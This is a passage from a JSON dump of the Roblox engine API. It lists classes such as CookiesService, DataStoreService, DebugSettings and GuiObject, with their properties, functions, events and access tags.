ault":null}],"Name":"UnbindButton","tags":[],"Class":"Controller","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Button","Name":"button","Default":null},{"Type":"string","Name":"caption","Default":null}],"Name":"bindButton","tags":["deprecated"],"Class":"Controller","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Button","Name":"button","Default":null}],"Name":"getButton","tags":["deprecated"],"Class":"Controller","type":"Function"},{"Arguments":[{"Name":"button","Type":"Button"}],"Name":"ButtonChanged","tags":[],"Class":"Controller","type":"Event"},{"Superclass":"Controller","type":"Class","Name":"HumanoidController","tags":[]},{"Superclass":"Controller","type":"Class","Name":"SkateboardController","tags":[]},{"ValueType":"float","type":"Property","Name":"Steer","tags":["readonly"],"Class":"SkateboardController"},{"ValueType":"float","type":"Property","Name":"Throttle","tags":["readonly"],"Class":"SkateboardController"},{"Arguments":[{"Name":"axis","Type":"string"}],"Name":"AxisChanged","tags":[],"Class":"SkateboardController","type":"Event"},{"Superclass":"Controller","type":"Class","Name":"VehicleController","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ControllerService","tags":["notCreatable"]},{"Superclass":"Instance","type":"Class","Name":"CookiesService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"DeleteCookieValue","tags":["RobloxSecurity"],"Class":"CookiesService","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"GetCookieValue","tags":["RobloxSecurity"],"Class":"CookiesService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"string","Name":"value","Default":null}],"Name":"SetCookieValue","tags":["RobloxSecurity"],"Class":"CookiesService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"CustomEvent","tags":["deprecated"]},{"ReturnType":"Objects","Arguments":[],"Name":"GetAttachedReceivers","tags":[],"Class":"CustomEvent","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"float","Name":"newValue","Default":null}],"Name":"SetValue","tags":[],"Class":"CustomEvent","type":"Function"},{"Arguments":[{"Name":"receiver","Type":"Instance"}],"Name":"ReceiverConnected","tags":[],"Class":"CustomEvent","type":"Event"},{"Arguments":[{"Name":"receiver","Type":"Instance"}],"Name":"ReceiverDisconnected","tags":[],"Class":"CustomEvent","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"CustomEventReceiver","tags":["deprecated"]},{"ValueType":"Object","type":"Property","Name":"Source","tags":[],"Class":"CustomEventReceiver"},{"ReturnType":"float","Arguments":[],"Name":"GetCurrentValue","tags":[],"Class":"CustomEventReceiver","type":"Function"},{"Arguments":[{"Name":"event","Type":"Instance"}],"Name":"EventConnected","tags":[],"Class":"CustomEventReceiver","type":"Event"},{"Arguments":[{"Name":"event","Type":"Instance"}],"Name":"EventDisconnected","tags":[],"Class":"CustomEventReceiver","type":"Event"},{"Arguments":[{"Name":"newValue","Type":"float"}],"Name":"SourceValueChanged","tags":[],"Class":"CustomEventReceiver","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"DataModelMesh","tags":["notbrowsable"]},{"ValueType":"Vector3","type":"Property","Name":"Offset","tags":[],"Class":"DataModelMesh"},{"ValueType":"Vector3","type":"Property","Name":"Scale","tags":[],"Class":"DataModelMesh"},{"ValueType":"Vector3","type":"Property","Name":"VertexColor","tags":[],"Class":"DataModelMesh"},{"Superclass":"DataModelMesh","type":"Class","Name":"BevelMesh","tags":["deprecated","notbrowsable"]},{"Superclass":"BevelMesh","type":"Class","Name":"BlockMesh","tags":[]},{"Superclass":"BevelMesh","type":"Class","Name":"CylinderMesh","tags":[]},{"Superclass":"DataModelMesh","type":"Class","Name":"FileMesh","tags":[]},{"ValueType":"Content","type":"Property","Name":"MeshId","tags":[],"Class":"FileMesh"},{"ValueType":"Content","type":"Property","Name":"TextureId","tags":[],"Class":"FileMesh"},{"Superclass":"FileMesh","type":"Class","Name":"SpecialMesh","tags":[]},{"ValueType":"MeshType","type":"Property","Name":"MeshType","tags":[],"Class":"SpecialMesh"},{"Superclass":"Instance","type":"Class","Name":"DataStoreService","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"LegacyNamingScheme","tags":["LocalUserSecurity"],"Class":"DataStoreService"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"string","Name":"scope","Default":"global"}],"Name":"GetDataStore","tags":[],"Class":"DataStoreService","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetGlobalDataStore","tags":[],"Class":"DataStoreService","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"string","Name":"name","Default":null},{"Type":"string","Name":"scope","Default":"global"}],"Name":"GetOrderedDataStore","tags":[],"Class":"DataStoreService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Debris","tags":[]},{"ValueType":"int","type":"Property","Name":"MaxItems","tags":["deprecated"],"Class":"Debris"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"item","Default":null},{"Type":"double","Name":"lifetime","Default":"10"}],"Name":"AddItem","tags":[],"Class":"Debris","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enabled","Default":null}],"Name":"SetLegacyMaxItems","tags":["LocalUserSecurity"],"Class":"Debris","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"item","Default":null},{"Type":"double","Name":"lifetime","Default":"10"}],"Name":"addItem","tags":["deprecated"],"Class":"Debris","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"DebugSettings","tags":["notbrowsable"]},{"ValueType":"int","type":"Property","Name":"AltCdnFailureCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"AltCdnSuccessCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"AvailablePhysicalMemory","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"BlockMeshSize","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"CPU","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CdnFailureCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"CdnResponceTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CdnSuccessCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CpuCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"CpuSpeed","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"DataModel","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"ElapsedTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"ErrorReporting","type":"Property","Name":"ErrorReporting","tags":[],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"GfxCard","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"InstanceCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"IsFmodProfilingEnabled","tags":[],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"IsProfilingEnabled","tags":[],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"IsScriptStackTracingEnabled","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"JobCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"LastCdnFailureTimeSpan","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"LuaRamLimit","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"NameDatabaseBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"NameDatabaseSize","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"OsIs64Bit","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"OsPlatform","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"OsPlatformId","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"OsVer","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PageFaultsPerSecond","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PageFileBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"float","type":"Property","Name":"PixelShaderModel","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PlayerCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PrivateBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"PrivateWorkingSetBytes","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"ProcessCores","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"ProcessorTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"ProfilingWindow","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"RAM","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"ReportExtendedMachineConfiguration","tags":[],"Class":"DebugSettings"},{"ValueType":"bool","type":"Property","Name":"ReportSoundWarnings","tags":[],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"Resolution","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"RobloxFailureCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"RobloxProductName","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"double","type":"Property","Name":"RobloxRespoceTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"RobloxSuccessCount","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"RobloxVersion","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"SIMD","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"string","type":"Property","Name":"SystemProductName","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"TickCountSampleMethod","type":"Property","Name":"TickCountPreciseOverride","tags":[],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"TotalPhysicalMemory","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"TotalProcessorTime","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"float","type":"Property","Name":"VertexShaderModel","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"VideoMemory","tags":["readonly"],"Class":"DebugSettings"},{"ValueType":"int","type":"Property","Name":"VirtualBytes","tags":["readonly"],"Class":"DebugSettings"},{"ReturnType":"void","Arguments":[],"Name":"LegacyScriptMode","tags":["LocalUserSecurity","deprecated"],"Class":"DebugSettings","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"ResetCdnFailureCounts","tags":["LocalUserSecurity"],"Class":"DebugSettings","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetBlockingRemove","tags":["LocalUserSecurity"],"Class":"DebugSettings","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"DebuggerBreakpoint","tags":["notCreatable"]},{"ValueType":"string","type":"Property","Name":"Condition","tags":[],"Class":"DebuggerBreakpoint"},{"ValueType":"bool","type":"Property","Name":"IsEnabled","tags":[],"Class":"DebuggerBreakpoint"},{"ValueType":"int","type":"Property","Name":"Line","tags":["readonly"],"Class":"DebuggerBreakpoint"},{"Superclass":"Instance","type":"Class","Name":"DebuggerManager","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"DebuggingEnabled","tags":["readonly"],"Class":"DebuggerManager"},{"ReturnType":"Instance","Arguments":[{"Type":"Instance","Name":"script","Default":null}],"Name":"AddDebugger","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"EnableDebugging","tags":["LocalUserSecurity"],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetDebuggers","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Resume","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepIn","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOut","tags":[],"Class":"DebuggerManager","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"StepOver","tags":[],"Class":"DebuggerManager","type":"Function"},{"Arguments":[{"Name":"debugger","Type":"Instance"}],"Name":"DebuggerAdded","tags":[],"Class":"DebuggerManager","type":"Event"},{"Arguments":[{"Name":"debugger","Type":"Instance"}],"Name":"DebuggerRemoved","tags":[],"Class":"DebuggerManager","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"DebuggerWatch","tags":[]},{"ValueType":"string","type":"Property","Name":"Expression","tags":[],"Class":"DebuggerWatch"},{"ReturnType":"void","Arguments":[],"Name":"CheckSyntax","tags":[],"Class":"DebuggerWatch","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Dialog","tags":[]},{"ValueType":"float","type":"Property","Name":"ConversationDistance","tags":[],"Class":"Dialog"},{"ValueType":"string","type":"Property","Name":"GoodbyeDialog","tags":[],"Class":"Dialog"},{"ValueType":"bool","type":"Property","Name":"InUse","tags":[],"Class":"Dialog"},{"ValueType":"string","type":"Property","Name":"InitialPrompt","tags":[],"Class":"Dialog"},{"ValueType":"DialogPurpose","type":"Property","Name":"Purpose","tags":[],"Class":"Dialog"},{"ValueType":"DialogTone","type":"Property","Name":"Tone","tags":[],"Class":"Dialog"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"Instance","Name":"dialogChoice","Default":null}],"Name":"SignalDialogChoiceSelected","tags":["RobloxScriptSecurity"],"Class":"Dialog","type":"Function"},{"Arguments":[{"Name":"player","Type":"Instance"},{"Name":"dialogChoice","Type":"Instance"}],"Name":"DialogChoiceSelected","tags":[],"Class":"Dialog","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"DialogChoice","tags":[]},{"ValueType":"string","type":"Property","Name":"GoodbyeDialog","tags":[],"Class":"DialogChoice"},{"ValueType":"string","type":"Property","Name":"ResponseDialog","tags":[],"Class":"DialogChoice"},{"ValueType":"string","type":"Property","Name":"UserDialog","tags":[],"Class":"DialogChoice"},{"Superclass":"Instance","type":"Class","Name":"DoubleConstrainedValue","tags":[]},{"ValueType":"double","type":"Property","Name":"ConstrainedValue","tags":["hidden"],"Class":"DoubleConstrainedValue"},{"ValueType":"double","type":"Property","Name":"MaxValue","tags":[],"Class":"DoubleConstrainedValue"},{"ValueType":"double","type":"Property","Name":"MinValue","tags":[],"Class":"DoubleConstrainedValue"},{"ValueType":"double","type":"Property","Name":"Value","tags":[],"Class":"DoubleConstrainedValue"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"Changed","tags":[],"Class":"DoubleConstrainedValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"changed","tags":["deprecated"],"Class":"DoubleConstrainedValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"Dragger","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"Axis","Name":"axis","Default":"X"}],"Name":"AxisRotate","tags":[],"Class":"Dragger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"mousePart","Default":null},{"Type":"Vector3","Name":"pointOnMousePart","Default":null},{"Type":"Objects","Name":"parts","Default":null}],"Name":"MouseDown","tags":[],"Class":"Dragger","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Ray","Name":"mouseRay","Default":null}],"Name":"MouseMove","tags":[],"Class":"Dragger","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"MouseUp","tags":[],"Class":"Dragger","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"Explosion","tags":[]},{"ValueType":"float","type":"Property","Name":"BlastPressure","tags":[],"Class":"Explosion"},{"ValueType":"float","type":"Property","Name":"BlastRadius","tags":[],"Class":"Explosion"},{"ValueType":"float","type":"Property","Name":"DestroyJointRadiusPercent","tags":[],"Class":"Explosion"},{"ValueType":"ExplosionType","type":"Property","Name":"ExplosionType","tags":[],"Class":"Explosion"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"Explosion"},{"Arguments":[{"Name":"part","Type":"Instance"},{"Name":"distance","Type":"float"}],"Name":"Hit","tags":[],"Class":"Explosion","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"FaceInstance","tags":["notbrowsable"]},{"ValueType":"NormalId","type":"Property","Name":"Face","tags":[],"Class":"FaceInstance"},{"Superclass":"FaceInstance","type":"Class","Name":"Decal","tags":[]},{"ValueType":"float","type":"Property","Name":"LocalTransparencyModifier","tags":["hidden"],"Class":"Decal"},{"ValueType":"float","type":"Property","Name":"Shiny","tags":["deprecated"],"Class":"Decal"},{"ValueType":"float","type":"Property","Name":"Specular","tags":["deprecated"],"Class":"Decal"},{"ValueType":"Content","type":"Property","Name":"Texture","tags":[],"Class":"Decal"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":[],"Class":"Decal"},{"Superclass":"Decal","type":"Class","Name":"Texture","tags":[]},{"ValueType":"float","type":"Property","Name":"StudsPerTileU","tags":[],"Class":"Texture"},{"ValueType":"float","type":"Property","Name":"StudsPerTileV","tags":[],"Class":"Texture"},{"Superclass":"Instance","type":"Class","Name":"Feature","tags":[]},{"ValueType":"NormalId","type":"Property","Name":"FaceId","tags":[],"Class":"Feature"},{"ValueType":"InOut","type":"Property","Name":"InOut","tags":[],"Class":"Feature"},{"ValueType":"LeftRight","type":"Property","Name":"LeftRight","tags":[],"Class":"Feature"},{"ValueType":"TopBottom","type":"Property","Name":"TopBottom","tags":[],"Class":"Feature"},{"Superclass":"Feature","type":"Class","Name":"Hole","tags":["deprecated"]},{"Superclass":"Feature","type":"Class","Name":"MotorFeature","tags":["deprecated"]},{"Superclass":"Instance","type":"Class","Name":"Fire","tags":[]},{"ValueType":"Color3","type":"Property","Name":"Color","tags":[],"Class":"Fire"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"Fire"},{"ValueType":"float","type":"Property","Name":"Heat","tags":[],"Class":"Fire"},{"ValueType":"Color3","type":"Property","Name":"SecondaryColor","tags":[],"Class":"Fire"},{"ValueType":"float","type":"Property","Name":"Size","tags":[],"Class":"Fire"},{"ValueType":"float","type":"Property","Name":"size","tags":["deprecated"],"Class":"Fire"},{"Superclass":"Instance","type":"Class","Name":"FlagStandService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"FlyweightService","tags":[]},{"Superclass":"FlyweightService","type":"Class","Name":"CSGDictionaryService","tags":[]},{"Superclass":"FlyweightService","type":"Class","Name":"NonReplicatedCSGDictionaryService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Folder","tags":[]},{"Superclass":"Instance","type":"Class","Name":"ForceField","tags":[]},{"Superclass":"Instance","type":"Class","Name":"FriendService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetBreakFriendUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetCreateFriendRequestUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetDeleteFriendRequestUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"enable","Default":null}],"Name":"SetEnabled","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetFriendsOnlineUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetGetFriendsUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"url","Default":null}],"Name":"SetMakeFriendUrl","tags":["LocalUserSecurity"],"Class":"FriendService","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"FunctionalTest","tags":["deprecated"]},{"ValueType":"string","type":"Property","Name":"Description","tags":[],"Class":"FunctionalTest"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Error","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Failed","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Pass","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Passed","tags":[],"Class":"FunctionalTest","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"message","Default":""}],"Name":"Warn","tags":[],"Class":"FunctionalTest","type":"Function"},{"Superclass":"Instance","type":"Class","Name":"GamePassService","tags":[]},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"playerHasPassUrl","Default":null}],"Name":"SetPlayerHasPassUrl","tags":["LocalUserSecurity"],"Class":"GamePassService","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"Instance","Name":"player","Default":null},{"Type":"int","Name":"gamePassId","Default":null}],"Name":"PlayerHasPass","tags":[],"Class":"GamePassService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"GameSettings","tags":["notbrowsable"]},{"ValueType":"float","type":"Property","Name":"BubbleChatLifetime","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"BubbleChatMaxBubbles","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"ChatHistory","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"ChatScrollLength","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"CollisionSoundEnabled","tags":["deprecated"],"Class":"GameSettings"},{"ValueType":"float","type":"Property","Name":"CollisionSoundVolume","tags":["deprecated"],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"HardwareMouse","tags":[],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"MaxCollisionSounds","tags":["deprecated"],"Class":"GameSettings"},{"ValueType":"int","type":"Property","Name":"ReportAbuseChatHistory","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"SoftwareSound","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"SoundEnabled","tags":[],"Class":"GameSettings"},{"ValueType":"bool","type":"Property","Name":"VideoCaptureEnabled","tags":[],"Class":"GameSettings"},{"ValueType":"VideoQualitySettings","type":"Property","Name":"VideoQuality","tags":[],"Class":"GameSettings"},{"Arguments":[{"Name":"recording","Type":"bool"}],"Name":"VideoRecordingChangeRequest","tags":["RobloxScriptSecurity"],"Class":"GameSettings","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"GamepadService","tags":[]},{"Superclass":"Instance","type":"Class","Name":"Geometry","tags":[]},{"Superclass":"Instance","type":"Class","Name":"GlobalDataStore","tags":[]},{"ReturnType":"Connection","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Function","Name":"callback","Default":null}],"Name":"OnUpdate","tags":[],"Class":"GlobalDataStore","type":"Function"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"key","Default":null}],"Name":"GetAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"ReturnType":"Variant","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"int","Name":"delta","Default":"1"}],"Name":"IncrementAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"ReturnType":"void","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Variant","Name":"value","Default":null}],"Name":"SetAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"ReturnType":"Tuple","Arguments":[{"Type":"string","Name":"key","Default":null},{"Type":"Function","Name":"transformFunction","Default":null}],"Name":"UpdateAsync","tags":[],"Class":"GlobalDataStore","type":"YieldFunction"},{"Superclass":"GlobalDataStore","type":"Class","Name":"OrderedDataStore","tags":[]},{"ReturnType":"Instance","Arguments":[{"Type":"bool","Name":"ascending","Default":null},{"Type":"int","Name":"pagesize","Default":null},{"Type":"Variant","Name":"minValue","Default":null},{"Type":"Variant","Name":"maxValue","Default":null}],"Name":"GetSortedAsync","tags":[],"Class":"OrderedDataStore","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"GroupService","tags":["notCreatable"]},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetAlliesAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"ReturnType":"Instance","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetEnemiesAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"ReturnType":"Variant","Arguments":[{"Type":"int","Name":"groupId","Default":null}],"Name":"GetGroupInfoAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetGroupsAsync","tags":[],"Class":"GroupService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"GuiBase","tags":[]},{"Superclass":"GuiBase","type":"Class","Name":"GuiBase2d","tags":["notbrowsable"]},{"ValueType":"Vector2","type":"Property","Name":"AbsolutePosition","tags":["readonly"],"Class":"GuiBase2d"},{"ValueType":"Vector2","type":"Property","Name":"AbsoluteSize","tags":["readonly"],"Class":"GuiBase2d"},{"Superclass":"GuiBase2d","type":"Class","Name":"GuiObject","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Active","tags":[],"Class":"GuiObject"},{"ValueType":"BrickColor","type":"Property","Name":"BackgroundColor","tags":["deprecated","hidden"],"Class":"GuiObject"},{"ValueType":"Color3","type":"Property","Name":"BackgroundColor3","tags":[],"Class":"GuiObject"},{"ValueType":"float","type":"Property","Name":"BackgroundTransparency","tags":[],"Class":"GuiObject"},{"ValueType":"BrickColor","type":"Property","Name":"BorderColor","tags":["deprecated","hidden"],"Class":"GuiObject"},{"ValueType":"Color3","type":"Property","Name":"BorderColor3","tags":[],"Class":"GuiObject"},{"ValueType":"int","type":"Property","Name":"BorderSizePixel","tags":[],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"ClipsDescendants","tags":[],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"Draggable","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionDown","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionLeft","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionRight","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"NextSelectionUp","tags":[],"Class":"GuiObject"},{"ValueType":"UDim2","type":"Property","Name":"Position","tags":[],"Class":"GuiObject"},{"ValueType":"float","type":"Property","Name":"Rotation","tags":[],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"Selectable","tags":[],"Class":"GuiObject"},{"ValueType":"Object","type":"Property","Name":"SelectionImageObject","tags":[],"Class":"GuiObject"},{"ValueType":"UDim2","type":"Property","Name":"Size","tags":[],"Class":"GuiObject"},{"ValueType":"SizeConstraint","type":"Property","Name":"SizeConstraint","tags":[],"Class":"GuiObject"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":["hidden"],"Class":"GuiObject"},{"ValueType":"bool","type":"Property","Name":"Visible","tags":[],"Class":"GuiObject"},{"ValueType":"int","type":"Property","Name":"ZIndex","tags":[],"Class":"GuiObject"},{"ReturnType":"bool","Arguments":[{"Type":"UDim2","Name":"endPosition","Default":null},{"Type":"EasingDirection","Name":"easingDirection","Default":"Out"},{"Type":"EasingStyle","Name":"easingStyle","Default":"Quad"},{"Type":"float","Name":"time","Default":"1"},{"Type":"bool","Name":"override","Default":"false"},{"Type":"Function","Name":"callback","Default":"nil"}],"Name":"TweenPosition","tags":[],"Class":"GuiObject","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UDim2","Name":"endSize","Default":null},{"Type":"EasingDirection","Name":"easingDirection","Default":"Out"},{"Type":"EasingStyle","Name":"easingStyle","Default":"Quad"},{"Type":"float","Name":"time","Default":"1"},{"Type":"bool","Name":"override","Default":"false"},{"Type":"Function","Name":"callback","Default":"nil"}],"Name":"TweenSize","tags":[],"Class":"GuiObject","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"UDim2","Name":"endSize","Default":null},{"Type":"UDim2","Name":"endPosition","Default":null},{"Type":"EasingDirection","Name":"easingDirection","Default":"Out"},{"Type":"EasingStyle","Name":"easingStyle","Default":"Quad"},{"Type":"float","Name":"time","Default":"1"},{"Type":"bool","Name":"override","Default":"false"},{"Type":"Function","Name":"callback","Default":"nil"}],"Name":"TweenSizeAndPosition","tags":[],"Class":"GuiObject","type":"Function"},{"Arguments":[{"Name":"initialPosition","Type":"UDim2"}],"Name":"DragBegin","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"x","Type":"int"},{"Name":"y","Type":"int"}],"Name":"DragStopped","tags":[],"Class":"GuiObject","type":"Event"},{"Arguments":[{"Name":"input","Type":"Instance"}],"Name":"InputBegan","tags"